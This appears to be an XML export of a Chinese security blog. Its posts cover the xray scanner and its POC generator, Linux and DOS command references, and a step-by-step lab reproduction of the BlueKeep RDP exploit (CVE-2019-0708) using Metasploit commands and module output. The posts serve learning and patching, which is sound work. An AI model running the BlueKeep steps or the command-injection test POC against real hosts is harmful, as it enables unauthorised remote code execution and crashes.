    <content type="text"><![CDATA[0x00 前言今天在网上意外看到一个在线的poc生成工具，传送门,界面如下 看到网址应该使用GitHub page来生成的，于是条件反射的觉得这个工具应该是开源的，so，复制xray-poc-generation到GitHub上搜一下看看，果然，和我猜测的一样，这个工具是开源的。 GitHub截图 0x01 编译项目 环境需求： Git 传送门 Node.js 传送门 Yarn 安装好Git后，使用git将项目克隆到本地 1git clone https://github.com/phith0n/xray-poc-generation 123cd xray-poc-generationyarn 原因：没有安装yarn 使用nmp install -g yarn一键安装 然后在使用yarn命令 yarn build 0x02 本地搭建 环境需求： Windows server 2003 PHPstudy 将编译好的build文件夹中的内容直接复制到www根目录 使用ipconfig命令查看Windows server 2003 ip地址 然后使用 http://ip地址 直接访问 注：如果直接将build文件夹复制到www目录下，需要修改index.html的文件，将相对路径改成含build的目录。 0x03 测试【测试数据】 123456789poc-yaml-testpost/poc?name=1command=&apos;id&apos;status == 200 &amp;&amp; body.bcontains(b&apos;test output&apos;)]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>POC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XRay-一款好用的漏洞挖掘工具]]></title>
    <url>%2F2019%2F09%2F17%2FXRay-%E4%B8%80%E6%AC%BE%E5%A5%BD%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[0x00 前言在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，netsparker等等。今天给大家介绍一款被动扫描的扫描漏洞的神器——Xray，这款工具我自己用过了，的确挺好用，还能让burpsuite作为下游代理，不耽误测试。 0x01 xray简介xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows /macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。 下载地址：传送门 官网地址：传送门 github地址：传送门 可检测漏洞模块 XSS漏洞检测 (key: xss) 利用语义分析的方式检测XSS漏洞 SQL 注入检测 (key: sqldet) 支持报错注入、布尔注入和时间盲注等 命令/代码注入检测 (key: cmd_injection) 支持 shell 命令注入、PHP 代码执行、模板注入等 目录枚举 (key: dirscan) 检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件 路径穿越检测 (key: path_traversal) 支持常见平台和编码 XML 实体注入检测 (key: xxe) 支持有回显和反连平台检测 poc 管理 (key: phantasm) 默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：https://chaitin.github.io/xray/#/guide/poc 文件上传检测 (key: upload) 支持常见的后端语言 弱口令检测 (key: brute_force) 社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典 jsonp 检测 (key: jsonp) 检测包含敏感信息可以被跨域读取的 jsonp 接口 ssrf 检测 (key: ssrf) ssrf 检测模块，支持常见的绕过技术和反连平台检测 基线检查 (key: baseline) 检测低 SSL 版本、缺失的或错误添加的 http 头等 任意跳转检测 (key: redirect) 支持 HTML meta 跳转、30x 跳转等 CRLF 注入 (key: crlf_injection) 检测 HTTP 头注入，支持 query、body 等位置的参数 .. 0x02 快速使用官网演示： 使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描 1xray webscan --basic-crawler http://example.com --html-output vuln.html 不指定输出时，默认输出到控制台的标准输出中,不同参数对应不同的输出方式： 1234#无参数：输出到控制台的标准输出--`text-output`：输出到文本文件中--`json-output`：输出到 JSON 文件中--`html-output`：输出到 HTML 文件中 使用HTTP代理进行被动扫描 1xray webscan --listen 127.0.0.1:7777 --html-output proxy.html 设置浏览器http代理为http://127.0.0.1:7777，就可以自动分析代理流量并扫描。 如需扫描https流量，请阅读下方文档抓取 https 流量部分 只扫描单个url，不使用爬虫 1xray webscan --url http://example.com/ ？a = b --html-output single-url.html 手动指定本次运行的插件 默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。 12xray webscan --plugins cmd_injection，sqldet --url http://example.comxray webscan --plugins cmd_injection，sqldet --listen 127.0.0.1:7777 指定插件输出 可以指定将本次扫描的漏洞信息输出到某个文件中： 12xray webscan --url http://example.com/ ？a = b--text-output result.txt --json-output result.json --html-output report.html 报告样例 运行只单个内置 POC 在xray中，所有的pocdency属于插件phantasm，所以使用poc时需要开启phantasm插件才可生效。--poc参数指定本次运行的poc，如不指定，将运行所有的内置poc。 1xray webscan --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce --url http://example.com/ 运行用户自定义POC 用户可以按需书写自己的YAML格式的POC，并通过指定--poc参数运行，比如运行在/home/test/1.yaml处的POC。 1xray webscan --plugins phantasm --poc /home/test/1.yaml --url http://example.com/ --poc 参数非常灵活，支持Glob匹配，支持从目录加载，可以从以下几个例子理解用法： 加载/home/test/pocs/所有的POC： 1xray webscan --plugins phantasm --poc “ / home / test / pocs / * ” 加载/home/test/pocs/下包含thinkphp的POC 1xray webscan --plugins phantasm --poc “ / home / test / pocs / * thinkphp * ” 自定义POC请查看文档。 转发漏洞信息到数据库，邮件，IM通知等 用户可以使用--webhook-output将漏洞信息进行转发，后端需要返回状态200才认为发送成功，否则将打印错误日志。 1xray webscan --url http://example.com/ --webhook-output http：// host：port / path ps:如何是Windows的，需要使用xray***.exe文件 0x03 抓取https流量3.1 生成证书和burp类似，抓取https流量需要信任一个根证书，这个根证书可以自行生成，也可用下列自带的命令生成： 123xray genca ## Linuxxray_windows_amd64.exe genca ##Windows 然后xray文件夹下会产生ca证书和ca.key两个文件 Firefox浏览器没有使用系统的根证书管理器，意味着使用Firefox时需要单独在该浏览内导入证书才可生效。对于移动端等，可以在挂代理之后访问http://xray/然后下载根证书。 未安装证书前，提示证书风险，访问https的网站会提示证书风险 3.2 安装证书 3.3 测试安装好证书后，重启浏览器，再次访问百度，可以看到没有证书不安全的标志了，说明证书安装成功 碰巧还看到了检测出一个漏洞 0x04 使用技巧4.1 常用命令虽然在刚刚前面的快速使用中命令有很多种，但是常用的命令就那几个 1xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html 浏览器设置本地代理，以360浏览器为例 然后通过浏览器手动点击一些页面，xray会自动对这些页面进行测试，非常好用 4.2 结合burpsuite使用burpsuite是个神器是大家公认的，对有很多网站不能使用像AWVS和APPscan这样的大型扫描器来进行测试的，所以只能使用burpsuite来进行手动测试了。在这里如果将burpsuite和xray结合在一起的话，那找漏洞是非常nice的。 0x04 参考链接1、https://www.anquanke.com/post/id/184204 2、https://www.jishuwen.com/d/2TvQ 3、 https://chaitin.github.io/xray ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-0708复现教程]]></title>
    <url>%2F2019%2F09%2F11%2FCVE-2019-0708%E5%A4%8D%E7%8E%B0%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 前言前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。 0x01 测试环境 攻击机：kali Linux 2019.2 靶机：Windows7 ultimate SP1 Windows server 2008 R2标准版 攻击框架：metasploit EXP：cve_2019_0708_bluekeep_rce 0x02 相关文件下载CVE-2019-0708 exp下载地址：传送门 Windows7 ultimate SP1下载地址： 1ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ Windows server 2008 R2标准版下载地址： 1ed2k://|file|cn_windows_server_2008_r2_hpc_edition_with_service_pack_1_x64_dvd_700632.iso|3071051776|7FDEE0F7A49FC63148D4DE580D803742|/ 0x03 开搞3.1 跟新metasploit框架首先需要跟新到最新的metasploit框架，版本是5.0.47版本 跟新命令脚本如下 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall 跟新完成的版本截图 跟新后可能会出现如下两个问题 意思是没有启动带数据库支持的MSF服务需要我们去启动，其实这对于复现漏洞没有影响，就是看着难受 【解决方法】 我们使用exit退出msfconsole,然后输入： 1/etc/init.d/postgresql start 输入完成后等待显示： 这个字样在输入：msfdb init 再次输入msfconsole，问题解决 3.2 替换exp文件首先需要下载0708的exp文件，这个文件在前面以及分享过了，也可以利用wget命令直接下载 1234567wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 然后，进入刚刚下载的exp的目录，然后使用下面命令替换原来的exp 123456789cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbcp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbmkdir /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp ##创建rdp目录cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 3.3 开始复现3.3.1 Windows 7 x64 sp1配置第一步：关闭防火墙 第二步：开启3389远程 3.3.2使用的命令12345678910msfconsole ##进入metasploit框架reload_all ##重新载入漏洞模块search 0708 ##搜索0708的漏洞use exploit/windows/rdp/cve_2019_0708_bluekeep _rce ##0708RDP攻击模块info ##查看漏洞的相关信息show options ##查看需要设置的参数set rhosts ##靶机ip ##设置需要攻击的靶机ip地址show targets ##显示可以攻击的靶机类型set target 数字 ##设置攻击的靶机类型exploit ##开始利用 msfconsole reload_all search 0708 info 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Name: CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After FreeModule: exploit/windows/rdp/cve_2019_0708_bluekeep_rcePlatform: WindowsArch: Privileged: YesLicense: Metasploit Framework License (BSD) Rank: Manual Disclosed: 2019-05-14Provided by: Sean Dillon &lt;sean.dillon@risksense.com&gt; Ryan Hanson &lt;dunno@findthisout.com&gt; OJ Reeves &lt;oj@beyondbinary.io&gt; Brent Cook &lt;bcook@rapid7.com&gt;Available targets: Id Name -- ---- 0 Automatic targeting via fingerprinting 1 Windows 7 SP1 / 2008 R2 (6.1.7601 x64) 2 Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox) 3 Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare) 4 Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)Check supported: YesBasic options: Name Current Setting Required Description ---- --------------- -------- ----------- RDP_CLIENT_IP 192.168.0.100 yes The client IPv4 address to report during connect RDP_CLIENT_NAME ethdev no The client computer name to report during connect, UNSET = random RDP_DOMAIN no The client domain name to report during connect RDP_USER no The username to report during connect, UNSET = random RHOSTS yes The target address range or CIDR identifier RPORT 3389 yes The target port (TCP)Payload information: Space: 952Description: The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120, allowing a malformed Disconnect Provider Indication message to cause use-after-free. With a controllable data/size remote nonpaged pool spray, an indirect call gadget of the freed channel is used to achieve arbitrary code execution.References: https://cvedetails.com/cve/CVE-2019-0708/ https://github.com/zerosum0x0/CVE-2019-0708Also known as: Bluekeep show options set rhosts 靶机IP地址 show targets set target 3 exploit ps: run和exploit都行 0x04 复现结果Windows server 2008 R2标准版出现蓝屏 Windows 7 ultimate sp1复现结果 0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具 （来源奇安信公众号） 【下载页面】https://www.qianxin.com/other/CVE-2019-0708【使用说明】 1、 下载文件进行解压。2、 使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。3、 在命令行工具，执行命令到工具所在文件夹4、 输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。5、 重启系统后，需要重新运行命令行来启用热补丁 【实现效果】在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：传送门支持系统： 1234567891011121314151617Windows XP for 32-bit Systems Service Pack 3Windows 7 for 32-bit SystemsWindows 7 for x64-based SystemsWindows 7 for 32-bit Systems Service Pack 1Windows 7 for x64-based Systems Service Pack 1Windows Server 2003 for 32-bit Systems Service Pack 2Windows Server 2003 R2 for 32-bit Systems Service Pack2Windows Server 2008 for 32-bit Systems Service Pack 2Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)Windows Server 2008 for x64-based Systems Service Pack2Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)Windows Server 2008 R2 for x64-based Systems ServicePack 1Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation)暂不支持的系统：Windows Server 2003 for x64-based Systems Service Pack2Windows Server 2008 for Itanium-Based Systems ServicePack 2Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1 0x05 总结从漏洞刚出来开始，我就开始复现，然后各种安装环境，操作系统，但是都没有复现成功，然后看各种文章，感觉都是那些基本操作，么有什么其他地方，然后我使用Windows 7 X64 ultimate sp1 和Windows server 2008 R2都没有复现成功，弄了两天我放弃了，今天我的一天同事也复现这个漏洞，点出了我的错误所在，原来，我讲set target 3 写成了set targets 3 ，我真是太粗心了，没有注意细节，以为show targets命令是列出可攻击的目标列表，就像当然的认为设置目标是set targets了。。。,然后一直复现不成功 最后，自己要记住这个教训，细节注定成败，而我这次败在了细节上，希望自己以后不会忽略这些小细节。共勉 :D 0x06 参考文档 https://blog.csdn.net/weixin_44114370/article/details/89440153 https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961 https://github.com/mai-lang-chai/CVE-2019-0708-RCE https://www.qianxin.com/other/CVE-2019-0708]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的HTTP响应状态码]]></title>
    <url>%2F2019%2F09%2F10%2F%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x00 前言 0x01 正文100 –继续–请求者应当继续提出请求。服务器已收到请求的一部分，正在等待其余部分 101 –切换协议–请求者已要求服务器切换协议，服务器已确认并准备切换 200 –成功–服务器已成功处理了请求 201 –已创建–请求成功并且服务器创建了新的资源 202 –已接受–服务器已接受请求，但尚未处理 203 –非授权信息–服务器已成功处理了请求，但返回的想你想可能来自另一个源 204 –无内容–服务器成功处理了请求，但没有返回任何内容 205 –重置内容–服务器成功处理了请求，内容被重置 206 –部分内容–服务器成功处理部分请求 300 –多种选择–针对请求，服务器可执行多种操作 301 –永久移动 –请求的网页已永久移动到新的位置，即永久重定向 302 –临时移动–请求的网页暂时跳转到其他按页面，即暂时重定向 303 –查看其他位置–如果原来的请求是POST，重定向目标文档应该通过GET提取 304 –未修改–此次请求返回的网页未修改，继续使用上次的资源 305 –使用代理–请求者应该使用代理访问该网页 307 –临时重定向–请求的资源临时从其他位置响应 400 –错误请求–服务器无法解析该请求 401 –未授权–请求没有进行身份验证或者验证未通过 403 –禁止访问–服务器拒绝此请求 404 –未找到–服务器找不到请求的网页 405 –方法禁用–服务器禁用了请求中指定的方法 406 –不接受 –无法使用请求的内容响应请求的网页。 407 –需要代理授权–请求者需要使用代理授权 408 –请求超时–服务器请求超时 409 –冲突–服务器在完成请求时发生冲突 410 –已删除–请求的资源已永久删除 411 –需要有效长度–服务器不接受不含有有效内容长度表头字段的请求。 501 –未实现–服务器不具备完成请求的功能502 –错误网关–服务器作为网关或者代理，从上游服务器收到无效响应503 –服务不可用–服务器目前无法使用504 –网关超时–服务器作为网关或者代理，但是没有及时从上游服务器收到请求505 –HTTP版本不支持–服务器不支持请求中所用的HTTP协议版本 ###]]></content>
  </entry>
  <entry>
    <title><![CDATA[基础Vim命令]]></title>
    <url>%2F2019%2F09%2F05%2F%E5%9F%BA%E7%A1%80Vim%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言 0x010x020x030x04###]]></content>
  </entry>
  <entry>
    <title><![CDATA[基础SQL语句]]></title>
    <url>%2F2019%2F09%2F05%2F%E5%9F%BA%E7%A1%80SQL%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言 0x010x020x030x04###]]></content>
  </entry>
  <entry>
    <title><![CDATA[基础Linux命令]]></title>
    <url>%2F2019%2F09%2F05%2F%E5%9F%BA%E7%A1%80Linux%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言Linux在渗透测试和安全运维的工作中都会经常使用，但是命令太多，作为一个普通的人类是不可能全部都记住的。所以在这里整理一个Linux命令的文档来方便自己日后查看。 0x01 基础命令1.1 cd命令这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如： 123cd /root/Docements # 切换到目录/root/Docements cd ./path # 切换到当前目录下的path目录中，“.”表示当前目录 cd ../path # 切换到上层目录中的path目录中，“..”表示上一层目录 1.2 ls命令这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下： 12345-l ：列出长数据串，包含文件的属性与权限数据等 -a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用） -d ：仅列出目录本身，而不是列出目录的文件数据 -h ：将文件容量以较易读的方式（GB，kB等）列出来 -R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来 注：这些参数也可以组合使用，下面举两个例子： 12ls -l #以长数据串的形式列出当前目录下的数据文件和目录 ls -lR #以长数据串的形式列出当前目录下的所有文件 1.3 grep命令该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等. 简单语法: grep [-acinv] [–color=auto] ‘查找字符串’ filename 它的常用参数如下： 1234567-a ：将binary文件以text文件的方式查找数据-c ：计算找到‘查找字符串’的次数-i ：忽略大小写的区别，即把大小写视为相同-v ：反向选择，即显示出没有‘查找字符串’内容的那一行# 例如：# 取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色grep --color=auto &apos;MANPATH&apos; /etc/man.config 12# 把ls -l的输出中包含字母file（不区分大小写）的内容输出ls -l | grep -i file 1.4 find命令find是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下： 语法：find [PATH] [option] [action] 与时间有关的参数： 1234-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件； -mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名； -mtime -n : 列出在n天之内（含n天本身）被更改过的文件名； -newer file : 列出比file还要新的文件名 ​ 例如： 1find /root -mtime 0 # 在当前目录下查找今天之内有改动的文件 与用户或用户组名有关的参数： 1234-user name : 列出文件所有者为name的文件 -group name : 列出文件所属用户组为name的文件 -uid n : 列出文件所有者为用户ID为n的文件 -gid n : 列出文件所属用户组为用户组ID为n的文件 ​ 例如： 1find /home/ljianhui -user ljianhui # 在目录/home/ljianhui中找出所有者为ljianhui的文件 与文件权限及名称有关的参数： ​ 例如： 12345find / -name passwd # 查找文件名为passwd的文件 find . -perm 0755 # 查找当前目录中文件权限的0755的文件 find . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte 语法：find [PATH] [option] [action] 1.5 cp命令该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下： 语法：[plain] view plain copy 123456789-a ：将文件的特性一起复制 -p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份 -i ：若目标文件已经存在时，在覆盖时会先询问操作的进行 -r ：递归持续复制，用于目录的复制行为 -u ：目标文件与源文件有差异时才会复制 ​ 例如 ： 123456cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2 cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中 cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中 1.6 mv命令该命令用于移动文件、目录或更名，move之意，它的常用参数如下： 12345-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖 -i ：若目标文件已经存在，就会询问是否覆盖 -u ：若目标文件已经存在，且比目标文件新，才会更新 PS：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。 1.7 rm命令该命令用于删除文件或目录，remove之间，它的常用参数如下： 12345-f ：就是force的意思，忽略不存在的文件，不会出现警告消息 -i ：互动模式，在删除前会询问用户是否操作 -r ：递归删除，最常用于目录删除，它是一个非常危险的参数 例如： 123rm -i file # 删除文件file，在删除之前会询问是否进行该操作 rm -fr dir # 强制删除目录dir中的所有文件 1.8 ps命令该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下： 123456789-A ：所有的进程均显示出来 -a ：不与terminal有关的所有进程 -u ：有效用户的相关进程 -x ：一般与a参数一起使用，可列出较完整的信息 -l ：较长，较详细地将PID的信息列出 其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下： 1234567ps aux # 查看系统所有的进程数据 ps ax # 查看不与terminal有关的所有进程 ps -lA # 查看系统所有的进程数据 ps axjf # 查看连同一部分进程树状态 1.9 kill命令该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下： 语法：kill -signal PID signal的常用参数如下： 注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。 1234567891：SIGHUP，启动被终止的进程 2：SIGINT，相当于输入ctrl+c，中断一个程序的进行 9：SIGKILL，强制中断一个进程的进行 15：SIGTERM，以正常的结束进程方式来终止进程 17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行 例如： 1234567# 以正常的结束进程方式来结束第一个后台工作，可用jobs命令查看后台中的第一个工作进程 kill -SIGTERM %1 # 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进筛选获得 kill -SIGHUP PID 1.10 killall命令该命令用于向一个命令启动的进程发送一个信号 语法：killall [-iIe] [command name] 参数 12345-i ：交互式的意思，若需要删除时，会询问用户-e ：表示后面接的command name要一致，但command name不能超过15个字符-I ：命令名称忽略大小写# 例如：killall -SIGHUP syslogd # 重新启动syslogd 1.11 file命令该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下： 123file filename#例如：file ./test ##1.12 tar命令 该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下： 12345678-c ：新建打包文件-t ：查看打包文件的内容含有哪些文件名-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中-j ：通过bzip2的支持进行压缩/解压缩-z ：通过gzip的支持进行压缩/解压缩-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来-f filename ：filename为要处理的文件-C dir ：指定压缩/解压缩的目录dir 虽然命令的参数很多，但是常用的只有3条 123压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称查询：tar -jtv -f filename.tar.bz2解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录 ps：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2 1.13 cat命令该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如： 12cat text | less # 查看text文件中的内容# 注：这条命令也可以使用less text来代替 1.14 chgrp命令该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下： 1234chgrp [-R] dirname/filename-R ：进行递归的持续对所有文件和子目录更改# 例如：chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users 1.15 chown命令该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。 1.16 chmod命令该命令用于改变文件的权限，一般的用法如下： 语法：chmod [-R] xyz 文件或目录 1-R：进行递归的持续更改，即连同子目录下的所有文件都会更改 例如： 12chmod 0755 file # 把file的文件权限改变为-rxwr-xr-xchmod g+w file # 向file的文件权限中加入用户组可写权限 1.171.18 vim命令该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载vim常用操作的详细说明。 1.19 gcc命令对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下： 1234567891011121314-o ：output之意，用于指定生成一个可执行文件的文件名-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序-I ：增加编译时搜索头文件的路径-L ：增加编译时搜索静态连接库的路径-S ：把源文件生成汇编代码文件-lm：表示标准库的目录中名为libm.a的函数库-lpthread ：连接NPTL实现的线程库-std= ：用于指定把使用的C语言的版本 # 例如：# 把源文件test.c按照c99标准编译成可执行程序testgcc -o test test.c -lm -std=c99#把源文件test.c转换为相应的汇编程序源文件test.sgcc -S test.c 1.20 time命令该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如： 12time ./processtime ps aux 在程序或命令运行结束后，在最后输出了三个时间，它们分别是：user：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；system：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；real：实际时间，从command命令行开始执行到运行终止的消逝时间； 注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。 0x02 转载链接https://blog.csdn.net/ljianhui/article/details/11100625/ ###]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基础DOS命令]]></title>
    <url>%2F2019%2F09%2F05%2F%E5%9F%BA%E7%A1%80DOS%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言在进行渗透测试的过程中，不免会用到DOS系统下的一些命令，所以这篇文章将常用的DOS命令进行整理归纳，方便他人学习和自己查看。 0x01 常用命令归纳1.1 dirdir是英文单词directory(目录）的缩写，主要用来显示一个目录下的文件和子目录。 [功能] 显示指定磁盘、目录中的文件和子目录信息，包括文件及子目录所在磁盘的卷标、文件与子目录的名称、每个文件的大小、文件及目录建立的日期时间，以及文件子目录的个数、所占用总字节数以及磁盘上的剩余总空间等信息。 [格式] dir [C:][path][filename][.ext][/o][/s][/p][/w][/a] [说明] dir是DOS命令中最常用的一个。斜杠表示后面的内容是参数。DOS参数最常用的是以下四个： 1234567891011121314参 数 意 义 :/p 显示信息满一屏时，暂停显示，按任意键后显示下一屏 /o 排序显示。o后面可以接不同意义的字母 /w 只显示文件名目录名，每行五个文件名。即宽行显示 /s 将目录及子目录的全部目录文件都显示 /a 显示隐藏文件 [举例] 显示C:\WINDOWS\Desktop文件夹里面的信息 1.2 mdmd是英文make directory（创建目录）的缩写 [功能] 创建一个子目录 [格式] md [C:]path [举例] 用md 建立一个叫做purple的目录 1.3 cdcd是英文change directory(改变目录）的缩写 [功能] 改变或显示当前目录 [格式] cd [C:][path] [说明] 路径可以使用绝对路径和相对路径两种。如果只有cd而没有参数，则只显示当前路径。注意：子目录中一定有两个“特殊目录”，即“.”“..”，其中一点表示当前目录，两点表示上一层目录。从简单实用的角度来看，我们只要学会逐层进入（cd 下一层某目录名），和逐层退出（cd..）就可以解决所有问题。当然也可以用绝对路径的办法。 [举例] 进入我们刚才建立的purple目录 